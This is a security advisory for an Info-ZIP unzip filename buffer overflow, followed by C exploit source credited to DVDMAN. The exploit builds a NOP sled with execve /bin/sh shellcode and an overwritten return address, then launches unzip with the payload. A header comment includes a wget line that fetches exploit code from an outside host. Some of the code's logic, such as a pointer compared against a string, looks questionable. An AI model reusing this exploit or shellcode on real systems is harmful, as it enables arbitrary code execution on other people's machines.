source: http://www.securityfocus.com/bid/15968/info

Info-ZIP 'unzip' is susceptible to a filename buffer-overflow vulnerability. The application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized memory buffer.

This issue allows attackers to execute arbitrary machine code in the context of users running the affected application. 

/*
By DVDMAN (DVDMAN@L33TSECURITY.COM)dvdman@snosoft.com
http://www.snosoft.com
http://WWW.L33TSECURITY.COM
L33T SECURITY
Keep It Private

based on code by hackbox.ath.cx
 > wget http://hackbox.ath.cx/mizc/unzip-expl.c

lame unzip <= 5.50
tested on redhat 7.2
By DVDMAN
L33TSECURITY.COM
*/


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#define MAX "\x39\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
#define BUF 3264+1900+20000
#define LOC 3262
#define OFFSET 700 // brute force it
char fakechunk[] = "\xf0\xff\xff\xff"
"\xfc\xff\xff\xff"
"\xde\x16\xe8\x77"
"\x42\x6c\xe8\x77";
char execshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89"
"\xc2\xb0\x0b\xcd\x80\x89\xc3\x31\xc0\x40"
"\xcd\x80"; /* newroot's shellcode */

int
main (int argc, char *argv[])
{

char buf[BUF + 1];
int x;
char *ptr;
int i=0,offset=OFFSET;
unsigned long addy = 0xbffffab0;
if (argc < 2) {
printf("[L33TSECURITY]");
printf("UNZIP EXPLOIT BY DVDMAN ");
printf("[L33TSECURITY]\n");
printf("[Usage] %s Offset\n",argv[0]);
return;
}
if (argc > 1) offset = atoi(argv[1]);

memset(buf,0x90,BUF);
ptr = buf + ((BUF) - strlen(execshell));

for (i=0;i<strlen(execshell);i++)
*(ptr++) = execshell[i];

*(long*)&buf[LOC] = addy + offset;
*(long*)&buf[LOC+4] = addy + offset;

buf[BUF] = 0;
if (buf < MAX) {
x = atoi(fakechunk + 2);
memset(buf,x,BUF);
execl("/usr/bin/unzip","unzip",buf,NULL);
}
execl("/usr/bin/unzip","unzip",buf,fakechunk,NULL);
return;
}
